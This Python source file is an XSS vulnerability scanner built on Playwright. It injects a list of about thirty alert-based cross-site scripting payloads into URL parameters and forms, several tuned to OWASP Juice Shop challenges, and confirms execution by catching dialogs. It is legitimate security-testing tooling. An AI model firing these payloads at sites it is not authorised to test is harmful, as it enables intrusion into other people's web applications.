"""
Playwright-based XSS Scanner

Uses a real browser to detect XSS vulnerabilities by:
1. Injecting payloads and checking if they execute (alert detection)
2. Detecting DOM-based XSS through actual JavaScript execution
3. Handling SPAs that render content client-side

OWASP: A03:2021 - Injection (XSS)
CWE-79: Improper Neutralization of Input During Web Page Generation
"""

import asyncio
import re
import json
from typing import List, Dict, Optional, Set, Tuple
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
import hashlib

try:
    from playwright.async_api import async_playwright, Page, Browser, BrowserContext, Dialog
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False

from ..base import BaseScanner, Vulnerability, Severity, OWASPCategory


class PlaywrightXSSScanner(BaseScanner):
    """XSS Scanner using Playwright for real browser-based detection"""
    
    name = "Playwright XSS Scanner"
    description = "Detects XSS vulnerabilities using real browser execution"
    owasp_category = OWASPCategory.A05_INJECTION
    
    # Unique marker for our payloads
    XSS_MARKER = "VULNFLOW_XSS_"
    
    def __init__(self, headless: bool = True):
        super().__init__()
        
        if not PLAYWRIGHT_AVAILABLE:
            raise ImportError("Playwright required. Install: pip install playwright && playwright install chromium")
        
        self.headless = headless
        self._browser: Optional[Browser] = None
        self._context: Optional[BrowserContext] = None
        self._tested_payloads: Set[str] = set()  # Avoid duplicates
        self._found_xss: Set[str] = set()  # Track found vulnerabilities
        
        # Generate unique ID for this scan
        self._scan_id = hashlib.md5(str(id(self)).encode()).hexdigest()[:8]
    
    def _get_payloads(self) -> List[Dict]:
        """Get XSS payloads with unique markers for detection - includes Juice Shop specific payloads"""
        marker = f"{self.XSS_MARKER}{self._scan_id}"
        
        payloads = [
            # ═══════════════════════════════════════════════════════════════
            # JUICE SHOP SPECIFIC PAYLOADS
            # ═══════════════════════════════════════════════════════════════
            
            # DOM XSS - Juice Shop search field (iframe src)
            # Challenge: "Perform a DOM XSS attack with <iframe src="javascript:alert(`xss`)">."
            {
                "payload": f'<iframe src="javascript:alert(`{marker}_JS1`)">',
                "type": "juiceshop_dom_xss_iframe",
                "marker": f"{marker}_JS1"
            },
            {
                "payload": '<iframe src="javascript:alert(`xss`)">',
                "type": "juiceshop_dom_xss_iframe_exact",
                "marker": "xss"
            },
            
            # Reflected XSS - Juice Shop order tracking
            # Challenge: "Perform a reflected XSS attack with <iframe src="javascript:alert(`xss`)">."
            {
                "payload": f'<iframe src="javascript:alert(`{marker}_JS2`)">',
                "type": "juiceshop_reflected_xss",
                "marker": f"{marker}_JS2"
            },
            
            # Bonus Payload XSS - Uses iframe with width/height
            # Challenge: "Use the bonus payload <iframe width="100%" height="166"..."
            {
                "payload": f'<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="javascript:alert(`{marker}_JS3`)"></iframe>',
                "type": "juiceshop_bonus_xss",
                "marker": f"{marker}_JS3"
            },
            
            # Juice Shop specific - backtick variations (ES6 template literals)
            {
                "payload": f'<script>alert(`{marker}_JS4`)</script>',
                "type": "juiceshop_backtick_script",
                "marker": f"{marker}_JS4"
            },
            {
                "payload": f'<img src=x onerror="alert(`{marker}_JS5`)">',
                "type": "juiceshop_backtick_img",
                "marker": f"{marker}_JS5"
            },
            {
                "payload": f'<svg onload="alert(`{marker}_JS6`)">',
                "type": "juiceshop_backtick_svg",
                "marker": f"{marker}_JS6"
            },
            
            # Juice Shop search API endpoint payloads
            {
                "payload": f'<img src=x onerror=alert(`{marker}_JS7`)>',
                "type": "juiceshop_search_img",
                "marker": f"{marker}_JS7"
            },
            
            # Angular-specific (Juice Shop uses Angular)
            {
                "payload": f'{{{{constructor.constructor("alert(`{marker}_JS8`)")()}}}}',
                "type": "juiceshop_angular_injection",
                "marker": f"{marker}_JS8"
            },
            {
                "payload": '{{constructor.constructor("alert(1)")()}}',
                "type": "juiceshop_angular_simple",
                "marker": "1"
            },
            
            # Sanitizer bypass attempts for Angular
            {
                "payload": f'<a href="javascript:alert(`{marker}_JS9`)">click</a>',
                "type": "juiceshop_href_javascript",
                "marker": f"{marker}_JS9"
            },
            {
                "payload": f'<form action="javascript:alert(`{marker}_JS10`)"><input type=submit>',
                "type": "juiceshop_form_action",
                "marker": f"{marker}_JS10"
            },
            
            # ═══════════════════════════════════════════════════════════════
            # ORIGINAL PAYLOADS (keeping existing ones)
            # ═══════════════════════════════════════════════════════════════
            
            # Basic script injection
            {
                "payload": f'<script>alert("{marker}_1")</script>',
                "type": "script_tag",
                "marker": f"{marker}_1"
            },
            {
                "payload": f'<script>alert(\'{marker}_2\')</script>',
                "type": "script_tag_single",
                "marker": f"{marker}_2"
            },
            
            # IMG tag with onerror
            {
                "payload": f'<img src=x onerror="alert(\'{marker}_3\')">',
                "type": "img_onerror",
                "marker": f"{marker}_3"
            },
            {
                "payload": f'<img/src=x onerror=alert("{marker}_4")>',
                "type": "img_onerror_nospace",
                "marker": f"{marker}_4"
            },
            
            # SVG with onload
            {
                "payload": f'<svg onload="alert(\'{marker}_5\')">',
                "type": "svg_onload",
                "marker": f"{marker}_5"
            },
            {
                "payload": f'<svg/onload=alert("{marker}_6")>',
                "type": "svg_onload_nospace",
                "marker": f"{marker}_6"
            },
            
            # Breaking out of attributes
            {
                "payload": f'" onmouseover="alert(\'{marker}_7\')" x="',
                "type": "attr_break_double",
                "marker": f"{marker}_7"
            },
            {
                "payload": f"' onmouseover='alert(\"{marker}_8\")' x='",
                "type": "attr_break_single",
                "marker": f"{marker}_8"
            },
            {
                "payload": f'"><script>alert("{marker}_9")</script>',
                "type": "attr_break_script",
                "marker": f"{marker}_9"
            },
            {
                "payload": f"'><script>alert('{marker}_10')</script>",
                "type": "attr_break_script_single",
                "marker": f"{marker}_10"
            },
            
            # Auto-triggering payloads
            {
                "payload": f'<input onfocus="alert(\'{marker}_11\')" autofocus>',
                "type": "input_autofocus",
                "marker": f"{marker}_11"
            },
            {
                "payload": f'<body onload="alert(\'{marker}_12\')">',
                "type": "body_onload",
                "marker": f"{marker}_12"
            },
            {
                "payload": f'<details open ontoggle="alert(\'{marker}_13\')">',
                "type": "details_ontoggle",
                "marker": f"{marker}_13"
            },
            
            # JavaScript protocol
            {
                "payload": f'javascript:alert("{marker}_14")',
                "type": "javascript_proto",
                "marker": f"{marker}_14"
            },
            
            # Event handlers with different events
            {
                "payload": f'<div onmouseover="alert(\'{marker}_15\')" style="position:fixed;top:0;left:0;width:100%;height:100%">',
                "type": "div_mouseover",
                "marker": f"{marker}_15"
            },
            
            # Template injection (Angular)
            {
                "payload": f'{{{{constructor.constructor("alert(\'{marker}_16\')")()}}}}',
                "type": "angular_template",
                "marker": f"{marker}_16"
            },
            {
                "payload": f'${{alert("{marker}_17")}}',
                "type": "template_literal",
                "marker": f"{marker}_17"
            },
            
            # Encoded payloads
            {
                "payload": f'<ScRiPt>alert("{marker}_18")</ScRiPt>',
                "type": "mixed_case",
                "marker": f"{marker}_18"
            },
            
            # Breaking out of JavaScript context
            {
                "payload": f"';alert('{marker}_19');//",
                "type": "js_break_single",
                "marker": f"{marker}_19"
            },
            {
                "payload": f'";alert("{marker}_20");//',
                "type": "js_break_double",
                "marker": f"{marker}_20"
            },
            {
                "payload": f"</script><script>alert('{marker}_21')</script>",
                "type": "script_break",
                "marker": f"{marker}_21"
            },
        ]
        
        return payloads
    
    async def scan_with_browser(
        self,
        base_url: str,
        forms: List[Dict],
        urls: Dict[str, dict],
        auth_token: Optional[str] = None
    ) -> List[Vulnerability]:
        """
        Main entry point for Playwright-based XSS scanning.
        """
        vulnerabilities = []
        
        # Validate base_url
        if not base_url:
            print("  [!] No base URL provided for Playwright XSS scan")
            return []
        
        # Clean the base URL
        base_url = base_url.rstrip('/')
        
        async with async_playwright() as p:
            try:
                self._browser = await p.chromium.launch(headless=self.headless)
                self._context = await self._browser.new_context(
                    viewport={'width': 1920, 'height': 1080},
                    user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                )
                
                # ══════════════════════════════════════════════════════════
                # FIX: Verify target is accessible before scanning
                # ══════════════════════════════════════════════════════════
                if not await self._verify_target_accessible(base_url):
                    print(f"  [!] Target {base_url} is not accessible, skipping Playwright XSS scan")
                    return []
                
                # Set auth token if provided
                if auth_token:
                    await self._setup_auth(base_url, auth_token)
                
                # Add a small delay to avoid overwhelming the server
                await asyncio.sleep(1)
                
                # Test URL parameters (limit to avoid timeout)
                url_list = list(urls.keys())[:20]  # Limit URLs to test
                print(f"  [*] Testing {len(url_list)} URLs for XSS...")
                
                for url in url_list:
                    try:
                        url_vulns = await self._test_url_params(url, auth_token)
                        vulnerabilities.extend(url_vulns)
                    except Exception as e:
                        # Continue on individual URL errors
                        continue
                
                # Test forms (limit to avoid timeout)
                forms_to_test = forms[:10]  # Limit forms to test
                print(f"  [*] Testing {len(forms_to_test)} forms for XSS...")
                
                for form in forms_to_test:
                    try:
                        form_vulns = await self._test_form(form, auth_token)
                        vulnerabilities.extend(form_vulns)
                    except Exception as e:
                        continue
                
            except Exception as e:
                print(f"  [!] Playwright XSS scan error: {e}")
            finally:
                if self._browser:
                    await self._browser.close()
        
        return vulnerabilities

    async def _verify_target_accessible(self, base_url: str, max_retries: int = 3) -> bool:
        """Verify the target is accessible before scanning"""
        page = await self._context.new_page()
        
        for attempt in range(max_retries):
            try:
                response = await page.goto(
                    base_url,
                    wait_until='domcontentloaded',
                    timeout=10000
                )
                
                if response and response.status < 500:
                    await page.close()
                    return True
                
            except Exception as e:
                if attempt < max_retries - 1:
                    # Wait before retry
                    await asyncio.sleep(2)
                    continue
                else:
                    print(f"  [!] Cannot reach {base_url}: {str(e)[:100]}")
        
        await page.close()
        return False

    async def _setup_auth(self, base_url: str, auth_token: str):
        """Set up authentication in the browser context"""
        page = await self._context.new_page()
        
        try:
            # Navigate to base URL first
            await page.goto(base_url, wait_until='domcontentloaded', timeout=15000)
            await page.wait_for_timeout(500)
            
            # Set token in localStorage
            await page.evaluate(f'''() => {{
                try {{
                    localStorage.setItem("token", "{auth_token}");
                }} catch(e) {{
                    console.log("Could not set localStorage");
                }}
            }}''')
            
            print(f"  [+] Auth token set in browser context")
            
        except Exception as e:
            print(f"  [!] Could not set auth token: {e}")
        finally:
            await page.close()
    
    async def _test_url_params(self, url: str, auth_token: Optional[str]) -> List[Vulnerability]:
        """Test URL parameters for XSS"""
        vulnerabilities = []
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            return vulnerabilities
        
        for param_name in params.keys():
            vuln_key = f"{parsed.path}:{param_name}"
            if vuln_key in self._found_xss:
                continue
            
            vuln = await self._test_parameter(
                url=url,
                param_name=param_name,
                method="GET",
                auth_token=auth_token
            )
            
            if vuln:
                self._found_xss.add(vuln_key)
                vulnerabilities.append(vuln)
            
            await asyncio.sleep(0.5)
        
        return vulnerabilities
    
    async def _test_form(self, form: Dict, auth_token: Optional[str]) -> List[Vulnerability]:
        """Test form inputs for XSS"""
        vulnerabilities = []
        
        action = form.get('action', '')
        method = form.get('method', 'POST').upper()
        inputs = form.get('inputs', [])
        
        for input_field in inputs:
            input_name = input_field.get('name')
            input_type = input_field.get('type', 'text')
            
            if not input_name:
                continue
            
            # Skip non-text inputs
            if input_type in ['hidden', 'submit', 'button', 'image', 'file', 'checkbox', 'radio']:
                continue
            
            # Skip if already found XSS for this input
            vuln_key = f"{action}:{input_name}"
            if vuln_key in self._found_xss:
                continue
            
            vuln = await self._test_form_input(
                action=action,
                method=method,
                inputs=inputs,
                target_input=input_name,
                auth_token=auth_token
            )
            
            if vuln:
                self._found_xss.add(vuln_key)
                vulnerabilities.append(vuln)
        
        return vulnerabilities
    
    async def _test_common_endpoints(self, base_url: str, auth_token: Optional[str]) -> List[Vulnerability]:
        """Test common XSS-prone endpoints including Juice Shop specific ones"""
        vulnerabilities = []
        
        # ═══════════════════════════════════════════════════════════════
        # JUICE SHOP SPECIFIC ENDPOINTS
        # ═══════════════════════════════════════════════════════════════
        juice_shop_endpoints = [
            # DOM XSS via search
            ('/#/search?q=', 'q'),
            # REST API search endpoint
            ('/rest/products/search?q=', 'q'),
            # Track order (Reflected XSS)
            ('/#/track-result?id=', 'id'),
            ('/rest/track-order/', None),  # Path-based injection
            # User profile
            ('/#/profile', None),
            # Feedback endpoint
            ('/api/Feedbacks', 'comment'),
            # Contact form
            ('/#/contact', None),
            # Basket
            ('/#/basket', None),
            # Complain page
            ('/#/complain', None),
        ]
        
        # Test Juice Shop endpoints
        for endpoint, param in juice_shop_endpoints:
            test_url = f"{base_url}{endpoint}"
            
            if param:
                vuln_key = f"{endpoint}:{param}"
                if vuln_key in self._found_xss:
                    continue
                
                # Test with payloads
                for payload_info in self._get_payloads()[:15]:  # Test first 15 payloads
                    payload = payload_info['payload']
                    marker = payload_info['marker']
                    
                    if param:
                        full_url = f"{test_url}{payload}"
                    else:
                        full_url = f"{test_url}/{payload}"
                    
                    result = await self._execute_and_detect(full_url, marker, auth_token)
                    
                    if result['xss_detected']:
                        self._found_xss.add(vuln_key if param else endpoint)
                        vulnerabilities.append(self.create_vulnerability(
                            vuln_type=f"Cross-Site Scripting ({result['detection_method']}) - Juice Shop",
                            severity=Severity.HIGH,
                            url=test_url,
                            parameter=param or "path",
                            payload=payload,
                            evidence=f"XSS confirmed via {result['detection_method']}",
                            description=f"Confirmed XSS vulnerability in Juice Shop endpoint. The payload executed in the browser.",
                            cwe_id="CWE-79",
                            cvss_score=6.1,
                            remediation=self._get_remediation(),
                            references=[
                                "https://owasp.org/www-community/attacks/xss/",
                                "https://pwning.owasp-juice.shop/appendix/solutions.html"
                            ]
                        ))
                        break  # Found XSS for this endpoint, move to next
                    
                    await asyncio.sleep(0.3)
        
        # ═══════════════════════════════════════════════════════════════
        # ORIGINAL COMMON ENDPOINTS
        # ═══════════════════════════════════════════════════════════════
        common_params = [
            ('q', '/search'),
            ('query', '/search'),
            ('search', '/search'),
            ('s', '/'),
            ('keyword', '/search'),
            ('term', '/search'),
            ('name', '/'),
            ('user', '/'),
            ('message', '/'),
            ('comment', '/'),
            ('text', '/'),
            ('input', '/'),
            ('data', '/'),
            ('value', '/'),
            ('content', '/'),
            ('title', '/'),
            ('body', '/'),
            ('description', '/'),
            ('redirect', '/'),
            ('url', '/'),
            ('next', '/'),
            ('return', '/'),
            ('callback', '/'),
        ]
        
        # Test common parameters
        for param, path in common_params:
            vuln_key = f"{path}:{param}"
            if vuln_key in self._found_xss:
                continue
            
            test_url = f"{base_url}{path}?{param}=test"
            
            # Quick check if endpoint exists
            page = await self._context.new_page()
            try:
                response = await page.goto(test_url, wait_until='domcontentloaded', timeout=5000)
                if response and response.status == 200:
                    await page.close()
                    
                    vuln = await self._test_parameter(
                        url=test_url,
                        param_name=param,
                        method="GET",
                        auth_token=auth_token
                    )
                    
                    if vuln:
                        self._found_xss.add(vuln_key)
                        vulnerabilities.append(vuln)
                else:
                    await page.close()
            except:
                await page.close()
                continue
        
        return vulnerabilities
    
    async def _test_parameter(
        self,
        url: str,
        param_name: str,
        method: str,
        auth_token: Optional[str]
    ) -> Optional[Vulnerability]:
        """Test a single parameter for XSS using Playwright"""
        
        payloads = self._get_payloads()
        
        for payload_info in payloads:
            payload = payload_info['payload']
            marker = payload_info['marker']
            payload_type = payload_info['type']
            
            # Skip if already tested this exact payload
            test_key = f"{url}:{param_name}:{payload_type}"
            if test_key in self._tested_payloads:
                continue
            self._tested_payloads.add(test_key)
            
            # Build test URL
            test_url = self._inject_payload_in_url(url, param_name, payload)
            
            # Test with Playwright
            result = await self._execute_and_detect(test_url, marker, auth_token)
            
            if result['xss_detected']:
                return self.create_vulnerability(
                    vuln_type=f"Cross-Site Scripting ({result['detection_method']})",
                    severity=Severity.HIGH,
                    url=url,
                    parameter=param_name,
                    payload=payload,
                    evidence=f"XSS confirmed via {result['detection_method']}. Payload type: {payload_type}",
                    description=f"Confirmed XSS vulnerability. The payload executed in the browser, demonstrating that malicious JavaScript can be injected and run.",
                    cwe_id="CWE-79",
                    cvss_score=6.1,
                    remediation=self._get_remediation(),
                    references=[
                        "https://owasp.org/www-community/attacks/xss/",
                        "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
                    ]
                )
        
        return None
    
    async def _test_form_input(
        self,
        action: str,
        method: str,
        inputs: List[Dict],
        target_input: str,
        auth_token: Optional[str]
    ) -> Optional[Vulnerability]:
        """Test a form input for XSS"""
        
        payloads = self._get_payloads()
        
        for payload_info in payloads[:10]:  # Limit payloads for forms
            payload = payload_info['payload']
            marker = payload_info['marker']
            payload_type = payload_info['type']
            
            result = await self._submit_form_and_detect(
                action=action,
                method=method,
                inputs=inputs,
                target_input=target_input,
                payload=payload,
                marker=marker,
                auth_token=auth_token
            )
            
            if result['xss_detected']:
                return self.create_vulnerability(
                    vuln_type=f"Cross-Site Scripting (Form - {result['detection_method']})",
                    severity=Severity.HIGH,
                    url=action,
                    parameter=target_input,
                    payload=payload,
                    evidence=f"XSS confirmed in form input. Payload type: {payload_type}",
                    description=f"Confirmed XSS vulnerability in form submission. Malicious JavaScript executes when the form is submitted.",
                    cwe_id="CWE-79",
                    cvss_score=6.1,
                    remediation=self._get_remediation(),
                    references=[
                        "https://owasp.org/www-community/attacks/xss/"
                    ]
                )
        
        return None
    
    async def _execute_and_detect(
        self,
        url: str,
        marker: str,
        auth_token: Optional[str]
    ) -> Dict:
        """Execute URL and detect if XSS payload fires"""
        
        result = {
            'xss_detected': False,
            'detection_method': None,
            'details': None
        }
        
        page = await self._context.new_page()
        
        # Track if alert was triggered
        alert_triggered = False
        alert_message = None
        
        async def handle_dialog(dialog: Dialog):
            nonlocal alert_triggered, alert_message
            alert_message = dialog.message
            if marker in dialog.message:
                alert_triggered = True
            await dialog.dismiss()
        
        page.on('dialog', handle_dialog)
        
        try:
            # Set auth token if available
            if auth_token:
                # Navigate to base first to set localStorage
                base_url = url.split('?')[0].rsplit('/', 1)[0]
                try:
                    await page.goto(base_url, wait_until='domcontentloaded', timeout=10000)
                    await page.evaluate(f'''() => {{
                        try {{ localStorage.setItem("token", "{auth_token}"); }} catch(e) {{}}
                    }}''')
                except:
                    pass  # Continue even if this fails
            
            # Navigate to test URL with shorter timeout
            try:
                await page.goto(url, wait_until='domcontentloaded', timeout=15000)
            except Exception as nav_error:
                # Check if alert was triggered during navigation error
                if alert_triggered:
                    result['xss_detected'] = True
                    result['detection_method'] = 'Alert Dialog (Navigation Error)'
                    return result
                # Navigation failed, skip this test
                return result
            
            # Wait for any delayed XSS
            await page.wait_for_timeout(1000)
            
            # Check if alert was triggered
            if alert_triggered:
                result['xss_detected'] = True
                result['detection_method'] = 'Alert Dialog'
                result['details'] = alert_message
                return result
            
            # Check for XSS via DOM inspection
            try:
                content = await page.content()
                if marker in content:
                    # Check dangerous contexts
                    dangerous_contexts = [
                        f'<script[^>]*>[^<]*{marker}',
                        f'on\\w+\\s*=\\s*["\'][^"\']*{marker}',
                        f'javascript:[^"\']*{marker}',
                    ]
                    
                    for pattern in dangerous_contexts:
                        if re.search(pattern, content, re.IGNORECASE):
                            result['xss_detected'] = True
                            result['detection_method'] = 'DOM Injection (Dangerous Context)'
                            return result
            except:
                pass
            
            # Try to trigger mouseover events
            try:
                await page.mouse.move(500, 300)
                await page.wait_for_timeout(300)
                
                if alert_triggered:
                    result['xss_detected'] = True
                    result['detection_method'] = 'Alert Dialog (Mouse Event)'
                    return result
            except:
                pass
            
        except Exception as e:
            # Check if XSS was found despite error
            if alert_triggered:
                result['xss_detected'] = True
                result['detection_method'] = 'Alert Dialog (With Error)'
        finally:
            try:
                await page.close()
            except:
                pass
        
        return result
    
    async def _submit_form_and_detect(
        self,
        action: str,
        method: str,
        inputs: List[Dict],
        target_input: str,
        payload: str,
        marker: str,
        auth_token: Optional[str]
    ) -> Dict:
        """Submit form with XSS payload and detect execution"""
        
        result = {
            'xss_detected': False,
            'detection_method': None
        }
        
        page = await self._context.new_page()
        
        alert_triggered = False
        
        async def handle_dialog(dialog: Dialog):
            nonlocal alert_triggered
            if marker in dialog.message:
                alert_triggered = True
            await dialog.dismiss()
        
        page.on('dialog', handle_dialog)
        
        try:
            # Navigate to form page
            if auth_token:
                base_url = action.rsplit('/', 1)[0] if '/' in action else action
                await page.goto(base_url, wait_until='domcontentloaded', timeout=5000)
                await page.evaluate(f'() => localStorage.setItem("token", "{auth_token}")')
            
            await page.goto(action, wait_until='networkidle', timeout=10000)
            
            # Fill form fields
            for input_field in inputs:
                input_name = input_field.get('name')
                if not input_name:
                    continue
                
                # Use XSS payload for target input, dummy values for others
                value = payload if input_name == target_input else 'test123'
                
                try:
                    # Try different selectors
                    selectors = [
                        f'input[name="{input_name}"]',
                        f'textarea[name="{input_name}"]',
                        f'input[formcontrolname="{input_name}"]',
                        f'#{input_name}',
                    ]
                    
                    for selector in selectors:
                        try:
                            elem = page.locator(selector).first
                            if await elem.count() > 0:
                                await elem.fill(value)
                                break
                        except:
                            continue
                except:
                    continue
            
            # Submit form
            try:
                await page.click('button[type="submit"], input[type="submit"]')
                await page.wait_for_timeout(2000)
            except:
                # Try pressing Enter
                await page.keyboard.press('Enter')
                await page.wait_for_timeout(2000)
            
            if alert_triggered:
                result['xss_detected'] = True
                result['detection_method'] = 'Alert Dialog (Form Submit)'
            
        except Exception as e:
            if alert_triggered:
                result['xss_detected'] = True
                result['detection_method'] = 'Alert Dialog (Form Error)'
        finally:
            await page.close()
        
        return result
    
    def _inject_payload_in_url(self, url: str, param_name: str, payload: str) -> str:
        """Inject XSS payload into URL parameter"""
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        
        # Set payload for target parameter
        params[param_name] = [payload]
        
        # Rebuild URL
        new_query = urlencode(params, doseq=True)
        new_url = urlunparse((
            parsed.scheme,
            parsed.netloc,
            parsed.path,
            parsed.params,
            new_query,
            parsed.fragment
        ))
        
        return new_url
    
    def _get_remediation(self) -> str:
        """Get XSS remediation advice"""
        return """
1. **Output Encoding**: Encode all user input before rendering:
   - HTML context: Encode < > & " '
   - JavaScript context: Use JSON.stringify()
   - URL context: Use encodeURIComponent()

2. **Content Security Policy**: Implement strict CSP headers:
   Content-Security-Policy: default-src 'self'; script-src 'self'

3. **Use Framework Protections**:
   - React: JSX auto-escapes by default
   - Angular: Uses contextual auto-escaping
   - Vue: Use v-text instead of v-html

4. **Input Validation**: Validate and sanitize input server-side

5. **HTTPOnly Cookies**: Prevent cookie theft via XSS

6. **Use DOMPurify**: For any HTML that must be rendered from user input
   const clean = DOMPurify.sanitize(dirty);
"""
    
    # Required by BaseScanner interface
    async def scan(self, session, url: str, params: Dict = None) -> List[Vulnerability]:
        """Fallback scan method (use scan_with_browser for full functionality)"""
        # This is a placeholder - the main scanning should use scan_with_browser
        return []